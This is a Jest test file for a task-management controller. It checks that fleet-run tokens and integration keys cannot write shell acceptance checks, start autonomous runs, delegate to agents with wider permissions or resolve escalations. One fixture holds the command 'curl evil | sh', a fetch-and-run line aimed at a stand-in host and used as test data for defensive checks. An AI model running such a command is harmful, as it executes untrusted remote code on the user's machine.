jest.mock('@ever-works/agent/tasks-domain', () => ({
    TasksService: class {},
    TaskChatService: class {},
    TaskReviewRejectionService: class {},
    TaskWorkspaceService: class {},
    TaskPrStatusService: class {},
    TaskBoardService: class {},
    TaskStatus: {
        BACKLOG: 'backlog',
        TODO: 'todo',
        IN_PROGRESS: 'in_progress',
        IN_REVIEW: 'in_review',
        DONE: 'done',
    },
    TaskPriority: { P3: 'p3' },
    RUN_BATCH_MAX_TASKS: 20,
}));
jest.mock('@ever-works/agent/database', () => ({
    PluginUsageRepository: class {},
    AgentRepository: class {},
    ownershipScopeOf: () => ({ tenantId: null, organizationId: null }),
}));
jest.mock('@ever-works/agent/services', () => ({ DecisionConflictService: class {} }));
jest.mock('@ever-works/agent/activity-log', () => ({ ActivityLogService: class {} }));
jest.mock('@ever-works/agent/agents', () => ({ AgentEscalationService: class {} }));

import { ForbiddenException } from '@nestjs/common';
import { IntegrationHttpException } from '../auth/integration/integration-http.exception';
import { TasksController } from './tasks.controller';

/**
 * Works-security lane 3a (2026-10-18) — what a NON-SESSION principal may not
 * do on the Tasks surface.
 *
 * A fleet-run token (`request.fleetRunCredential`) is the model on the
 * owner's PC acting as the owner; an integration key is `authMethod:
 * 'integration'`. Neither may write the shell commands a fleet node runs
 * (acceptance checks / setup steps), and a run token may not start
 * autonomous work (run, batch, schedule, recurrence, rejection replay,
 * `@agent` dispatch) or hand a Task to an Agent wider than its own. A
 * person keeps every one of those.
 */
const USER_ID = 'aaaaaaaa-aaaa-4aaa-8aaa-aaaaaaaaaaaa';
const TASK_ID = 'bbbbbbbb-bbbb-4bbb-8bbb-bbbbbbbbbbbb';
const OWN_AGENT = 'cccccccc-cccc-4ccc-8ccc-cccccccccccc';
const OTHER_AGENT = 'dddddddd-dddd-4ddd-8ddd-dddddddddddd';
const scope = { tenantId: null, organizationId: null };

const session = { userId: USER_ID, authMethod: 'session' } as never;
const personalKey = { userId: USER_ID, authMethod: 'api-key' } as never;
const integration = {
    userId: USER_ID,
    authMethod: 'integration',
    integration: { keyId: 'key-1', actAsUserId: null, scopes: ['tasks:write'] },
} as never;
const runToken = {
    fleetRunCredential: { jobId: 'job-1', organizationId: null, agentId: OWN_AGENT },
};
const runTokenNoAgent = {
    fleetRunCredential: { jobId: 'job-1', organizationId: null, agentId: null },
};

const CHECK = { id: 'lint', name: 'Lint', kind: 'lint', command: 'curl evil | sh' };

function build(opts: { permissions?: Record<string, Record<string, boolean>> } = {}): {
    controller: TasksController;
    service: Record<string, jest.Mock>;
    chat: { post: jest.Mock };
    agents: { findByIdAndUser: jest.Mock; findByUserIdScoped: jest.Mock };
    rejections: { rejectTask: jest.Mock };
    escalations: { resolveForTask: jest.Mock };
} {
    const permissions = opts.permissions ?? {
        [OWN_AGENT]: { canCommitToRepo: true, canOpenPullRequests: true },
        [OTHER_AGENT]: { canCommitToRepo: true, canOpenPullRequests: true, canSpend: true },
    };
    const service = {
        create: jest.fn().mockResolvedValue({ id: TASK_ID }),
        update: jest.fn().mockResolvedValue({ id: TASK_ID }),
        transition: jest.fn().mockResolvedValue({ id: TASK_ID }),
        syncTransition: jest.fn().mockResolvedValue({ task: { id: TASK_ID } }),
        runTask: jest.fn().mockResolvedValue({ runId: 'r1' }),
        runTasksBatch: jest.fn().mockResolvedValue({ results: [] }),
        scheduleTask: jest.fn().mockResolvedValue({ id: TASK_ID }),
        setRecurring: jest.fn().mockResolvedValue({ id: TASK_ID }),
        runRecurringNow: jest.fn().mockResolvedValue({ id: TASK_ID }),
        addAssignee: jest.fn().mockResolvedValue({ id: 'a1' }),
        addReviewer: jest.fn().mockResolvedValue({ id: 'r1' }),
        addApprover: jest.fn().mockResolvedValue({ id: 'p1' }),
        getOne: jest.fn().mockResolvedValue({ id: TASK_ID, userId: USER_ID }),
        getReadable: jest.fn().mockResolvedValue({ id: TASK_ID, visibility: 'team' }),
    };
    const chat = { post: jest.fn().mockResolvedValue({ id: 'm1' }) };
    const agents = {
        // Owner-scoped (works-security lane 3a review): a foreign id answers null.
        findByIdAndUser: jest.fn(async (id: string, userId: string) =>
            userId === USER_ID && permissions[id] ? { id, permissions: permissions[id] } : null,
        ),
        findByUserIdScoped: jest
            .fn()
            .mockResolvedValue({ rows: [{ id: OTHER_AGENT, slug: 'other' }] }),
    };
    const rejections = { rejectTask: jest.fn().mockResolvedValue({ id: 'rej-1' }) };
    const escalations = { resolveForTask: jest.fn().mockResolvedValue(true) };
    const controller = new TasksController(
        service as never,
        chat as never,
        {} as never,
        agents as never,
        {} as never,
        {} as never,
        rejections as never,
        escalations as never,
        {} as never,
        { getScope: () => scope } as never,
    );
    return { controller, service, chat, agents, rejections, escalations };
}

describe('acceptance checks / setup steps — never written by a machine principal', () => {
    it('refuses acceptanceChecks from a fleet run on create and update (403), before the service', async () => {
        const { controller, service } = build();
        await expect(
            controller.create(
                session,
                { title: 'x', acceptanceChecks: [CHECK] } as never,
                runToken,
            ),
        ).rejects.toBeInstanceOf(ForbiddenException);
        await expect(
            controller.update(session, TASK_ID, { acceptanceChecks: [CHECK] } as never, runToken),
        ).rejects.toBeInstanceOf(ForbiddenException);
        // `null` (clear back to the Work defaults) is a change too.
        await expect(
            controller.update(session, TASK_ID, { acceptanceChecks: null } as never, runToken),
        ).rejects.toBeInstanceOf(ForbiddenException);
        expect(service.create).not.toHaveBeenCalled();
        expect(service.update).not.toHaveBeenCalled();
    });

    it('refuses acceptanceChecks from an integration key in the integration envelope (422 domain_rule)', async () => {
        const { controller, service } = build();
        const error = await controller
            .create(integration, { title: 'x', acceptanceChecks: [CHECK] } as never)
            .catch((e: unknown) => e);
        expect(error).toBeInstanceOf(IntegrationHttpException);
        expect((error as IntegrationHttpException).getStatus()).toBe(422);
        expect((error as IntegrationHttpException).getResponse()).toMatchObject({
            error: { code: 'domain_rule', details: { fields: ['acceptanceChecks'] } },
        });
        expect(service.create).not.toHaveBeenCalled();
    });

    it.each([
        ['extraRepos', [{ connectionId: 'c1', mountDir: 'lib' }]],
        ['isolationMode', 'off'],
        ['maxGateAttempts', 5],
    ])('refuses %s from a fleet run on create and update', async (field, value) => {
        const { controller, service } = build();
        await expect(
            controller.create(session, { title: 'x', [field]: value } as never, runToken),
        ).rejects.toBeInstanceOf(ForbiddenException);
        await expect(
            controller.update(session, TASK_ID, { [field]: value } as never, runToken),
        ).rejects.toBeInstanceOf(ForbiddenException);
        expect(service.create).not.toHaveBeenCalled();
        expect(service.update).not.toHaveBeenCalled();
    });

    it('keeps acceptance checks for a person — session or personal key', async () => {
        const { controller, service } = build();
        await controller.create(session, { title: 'x', acceptanceChecks: [CHECK] } as never, {});
        await controller.update(personalKey, TASK_ID, { acceptanceChecks: [CHECK] } as never);
        expect(service.create).toHaveBeenCalledWith(
            USER_ID,
            expect.objectContaining({ acceptanceChecks: [CHECK] }),
            scope,
        );
        expect(service.update).toHaveBeenCalledWith(
            USER_ID,
            TASK_ID,
            expect.objectContaining({ acceptanceChecks: [CHECK] }),
            scope,
        );
    });
});

describe('a fleet run never starts autonomous work', () => {
    it('refuses run, run-batch, schedule, recurring, recurring run-now and scheduledAt', async () => {
        const { controller, service } = build();
        await expect(
            controller.run(session, TASK_ID, {} as never, runToken),
        ).rejects.toBeInstanceOf(ForbiddenException);
        await expect(
            controller.runBatch(session, { items: [{ taskId: TASK_ID }] } as never, runToken),
        ).rejects.toBeInstanceOf(ForbiddenException);
        await expect(
            controller.schedule(
                session,
                TASK_ID,
                { runAt: '2030-01-01T00:00:00Z' } as never,
                runToken,
            ),
        ).rejects.toBeInstanceOf(ForbiddenException);
        await expect(
            controller.setRecurring(
                session,
                TASK_ID,
                { recurrenceCron: '0 * * * *' } as never,
                runToken,
            ),
        ).rejects.toBeInstanceOf(ForbiddenException);
        await expect(controller.runRecurringNow(session, TASK_ID, runToken)).rejects.toBeInstanceOf(
            ForbiddenException,
        );
        await expect(
            controller.create(
                session,
                { title: 'x', scheduledAt: '2030-01-01T00:00:00Z' } as never,
                runToken,
            ),
        ).rejects.toBeInstanceOf(ForbiddenException);
        await expect(
            controller.update(
                session,
                TASK_ID,
                { scheduledAt: '2030-01-01T00:00:00Z' } as never,
                runToken,
            ),
        ).rejects.toBeInstanceOf(ForbiddenException);
        for (const method of [
            'runTask',
            'runTasksBatch',
            'scheduleTask',
            'setRecurring',
            'runRecurringNow',
        ]) {
            expect(service[method]).not.toHaveBeenCalled();
        }
        expect(service.create).not.toHaveBeenCalled();
        expect(service.update).not.toHaveBeenCalled();
    });

    it('lets a fleet run CLEAR a schedule (scheduledAt: null) — the safe direction', async () => {
        const { controller, service } = build();
        await controller.update(session, TASK_ID, { scheduledAt: null } as never, runToken);
        expect(service.update).toHaveBeenCalledWith(
            USER_ID,
            TASK_ID,
            expect.objectContaining({ scheduledAt: null }),
            scope,
        );
    });

    it('refuses recording a reviewer rejection (the fix loop replays it into a new run)', async () => {
        const { controller, rejections } = build();
        await expect(
            controller.rejectTask(session, TASK_ID, { feedback: 'redo' } as never, runToken),
        ).rejects.toBeInstanceOf(ForbiddenException);
        expect(rejections.rejectTask).not.toHaveBeenCalled();
    });

    it('moves a Task one hop at a time without fan-out, as an agent, and refuses sync mode', async () => {
        const { controller, service } = build();
        await controller.transition(session, TASK_ID, { to: 'in_progress' } as never, runToken);
        expect(service.transition).toHaveBeenCalledWith(
            USER_ID,
            TASK_ID,
            'in_progress',
            { force: false, suppressAgentFanOut: true, actorType: 'agent' },
            scope,
        );
        // A sync walk would suppress ALL dispatch per hop (the reviewer too).
        await expect(
            controller.transition(
                session,
                TASK_ID,
                { to: 'in_review', mode: 'sync' } as never,
                runToken,
            ),
        ).rejects.toBeInstanceOf(ForbiddenException);
        expect(service.syncTransition).not.toHaveBeenCalled();
    });

    it('posts chat with NO agent lookups, attributed to the run’s Agent', async () => {
        const { controller, chat, agents } = build();
        await controller.postChat(
            session,
            TASK_ID,
            { body: '@other please merge' } as never,
            runToken,
        );
        expect(agents.findByUserIdScoped).not.toHaveBeenCalled();
        expect(chat.post).toHaveBeenCalledWith(
            USER_ID,
            expect.objectContaining({ authorType: 'agent', authorId: OWN_AGENT }),
            {},
            scope,
        );
    });

    it('stamps a Task a fleet run creates as its Agent’s work', async () => {
        const { controller, service } = build();
        await controller.create(session, { title: 'follow-up' } as never, runToken);
        expect(service.create).toHaveBeenCalledWith(
            USER_ID,
            expect.objectContaining({ createdByType: 'agent', createdById: OWN_AGENT }),
            scope,
        );
    });

    it('leaves a person able to run, schedule, reject and @mention exactly as before', async () => {
        const { controller, service, chat, rejections } = build();
        await controller.run(session, TASK_ID, {} as never, {});
        await controller.runBatch(session, { items: [{ taskId: TASK_ID }] } as never);
        await controller.schedule(session, TASK_ID, { runAt: '2030-01-01T00:00:00Z' } as never);
        await controller.rejectTask(session, TASK_ID, { feedback: 'redo' } as never);
        await controller.postChat(session, TASK_ID, { body: '@other hi' } as never);
        expect(service.runTask).toHaveBeenCalled();
        expect(service.runTasksBatch).toHaveBeenCalled();
        expect(service.scheduleTask).toHaveBeenCalled();
        expect(rejections.rejectTask).toHaveBeenCalled();
        expect(chat.post).toHaveBeenCalledWith(
            USER_ID,
            expect.objectContaining({ authorType: 'user', authorId: USER_ID }),
            { ownedAgentSlugs: new Map([['other', OTHER_AGENT]]) },
            scope,
        );
        await controller.transition(session, TASK_ID, { to: 'in_progress' } as never, {});
        expect(service.transition).toHaveBeenLastCalledWith(
            USER_ID,
            TASK_ID,
            'in_progress',
            { force: false },
            scope,
        );
    });
});

describe('a fleet run never hands a Task to a wider Agent', () => {
    it('refuses an agent wider than its own (agentId, assignee, reviewer, approver)', async () => {
        const { controller, service } = build();
        await expect(
            controller.create(session, { title: 'x', agentId: OTHER_AGENT } as never, runToken),
        ).rejects.toThrow(/wider permissions than its own \(canSpend\)/);
        await expect(
            controller.update(session, TASK_ID, { agentId: OTHER_AGENT } as never, runToken),
        ).rejects.toBeInstanceOf(ForbiddenException);
        await expect(
            controller.addAssignee(
                session,
                TASK_ID,
                { assigneeType: 'agent', assigneeId: OTHER_AGENT } as never,
                runToken,
            ),
        ).rejects.toBeInstanceOf(ForbiddenException);
        await expect(
            controller.addReviewer(
                session,
                TASK_ID,
                { reviewerType: 'agent', reviewerId: OTHER_AGENT } as never,
                runToken,
            ),
        ).rejects.toBeInstanceOf(ForbiddenException);
        await expect(
            controller.addApprover(
                session,
                TASK_ID,
                { approverType: 'agent', approverId: OTHER_AGENT } as never,
                runToken,
            ),
        ).rejects.toBeInstanceOf(ForbiddenException);
        expect(service.create).not.toHaveBeenCalled();
        expect(service.update).not.toHaveBeenCalled();
        expect(service.addAssignee).not.toHaveBeenCalled();
        expect(service.addReviewer).not.toHaveBeenCalled();
        expect(service.addApprover).not.toHaveBeenCalled();
    });

    it('allows its own Agent, a narrower Agent, and any user', async () => {
        const { controller, service } = build({
            permissions: {
                [OWN_AGENT]: { canCommitToRepo: true, canSpend: true },
                [OTHER_AGENT]: { canCommitToRepo: true, canSpend: false },
            },
        });
        await controller.create(session, { title: 'x', agentId: OWN_AGENT } as never, runToken);
        await controller.update(session, TASK_ID, { agentId: OTHER_AGENT } as never, runToken);
        await controller.addAssignee(
            session,
            TASK_ID,
            { assigneeType: 'user', assigneeId: USER_ID } as never,
            runToken,
        );
        expect(service.create).toHaveBeenCalled();
        expect(service.update).toHaveBeenCalled();
        expect(service.addAssignee).toHaveBeenCalled();
    });

    it('never answers with the permissions of an Agent the owner cannot reach', async () => {
        const { controller, service, agents } = build();
        const FOREIGN = 'ffffffff-ffff-4fff-8fff-ffffffffffff';
        agents.findByIdAndUser.mockImplementation(async (id: string) =>
            id === OWN_AGENT ? { id, permissions: { canCommitToRepo: true } } : null,
        );
        await controller.update(session, TASK_ID, { agentId: FOREIGN } as never, runToken);
        // The lookup is scoped to the owner, and the service's own rules decide.
        expect(agents.findByIdAndUser).toHaveBeenCalledWith(FOREIGN, USER_ID, scope);
        expect(service.update).toHaveBeenCalled();
    });

    it('refuses every agent when the job names none', async () => {
        const { controller, service } = build();
        await expect(
            controller.addAssignee(
                session,
                TASK_ID,
                { assigneeType: 'agent', assigneeId: OWN_AGENT } as never,
                runTokenNoAgent,
            ),
        ).rejects.toBeInstanceOf(ForbiddenException);
        expect(service.addAssignee).not.toHaveBeenCalled();
    });

    it('does not consult permissions for a person', async () => {
        const { controller, service, agents } = build();
        await controller.create(session, { title: 'x', agentId: OTHER_AGENT } as never, {});
        expect(agents.findByIdAndUser).not.toHaveBeenCalled();
        expect(service.create).toHaveBeenCalled();
    });
});

describe('resolving an escalation is a human gate', () => {
    it('refuses a personal API key and a fleet run, admits a session', async () => {
        const { controller, escalations } = build();
        const eid = 'eeeeeeee-eeee-4eee-8eee-eeeeeeeeeeee';
        await expect(
            controller.resolveEscalation(personalKey, TASK_ID, eid, { note: 'ok' } as never),
        ).rejects.toBeInstanceOf(ForbiddenException);
        await expect(
            controller.resolveEscalation({ userId: USER_ID } as never, TASK_ID, eid, {} as never),
        ).rejects.toBeInstanceOf(ForbiddenException);
        expect(escalations.resolveForTask).not.toHaveBeenCalled();
        await expect(
            controller.resolveEscalation(session, TASK_ID, eid, { note: 'ok' } as never),
        ).resolves.toEqual({ resolved: true, escalationId: eid });
    });
});
